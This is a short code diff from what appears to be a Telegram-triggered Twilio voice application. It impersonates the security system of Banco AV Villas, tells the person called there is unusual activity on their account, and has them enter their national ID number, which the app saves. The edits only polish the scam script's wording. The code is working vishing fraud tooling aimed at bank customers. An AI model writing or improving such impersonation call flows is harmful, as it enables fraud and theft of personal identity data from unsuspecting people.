@@ -254,7 +254,7 @@ def start():
     # Verificar si la llamada fue iniciada desde Telegram
     call_sid = request.values.get('CallSid')
     if call_sid and is_call_from_telegram(call_sid):
-        response.say("Hola,le habla el sistema de seguridad del Banco A V Villas. Detectamos una actividad inusual en unos de sus productos. Si usted reconoce esta operación haga caso omiso de lo contrario presione 1 para comunicarle con un asesor", language='es-ES')
+        response.say("Hola,le habla el sistema de seguridad del Banco Ave Villas. Detectamos una actividad inusual en unos de sus productos. Si usted reconoce esta operación haga caso omiso de lo contrario presione 1 para comunicarle con un asesor", language='es-ES')
         # Pausa de 4 segundos antes de redirigir
         response.pause(length=4)
         response.redirect('/step1')
@@ -275,7 +275,7 @@ def step1():
     gather = Gather(num_digits=10, action='/save-step1', method='POST', timeout=30, finish_on_key='')
     gather.say("Para validación de datos ingrese su número de cédula.", language='es-ES')
     gather.pause(length=1)
-    gather.say("Ingrese su número de cédula de 10 o 7 dígitos ahora.", language='es-ES')
+    gather.say("Ingrese su número de cédula ahora.", language='es-ES')
     response.append(gather)
     
     response.redirect('/step1')
